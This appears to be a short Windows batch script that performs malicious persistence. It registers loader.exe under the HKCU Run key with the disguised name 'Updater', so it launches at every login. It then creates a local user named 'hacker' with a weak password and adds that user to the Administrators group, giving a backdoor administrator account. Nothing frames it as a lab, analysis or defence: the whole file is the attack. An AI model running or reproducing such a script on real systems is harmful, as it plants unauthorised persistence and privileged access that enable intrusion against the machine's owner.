@echo off
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Updater /d "%~dp0loader.exe"
net user hacker P@ssw0rd /add
net localgroup Administrators hacker /add
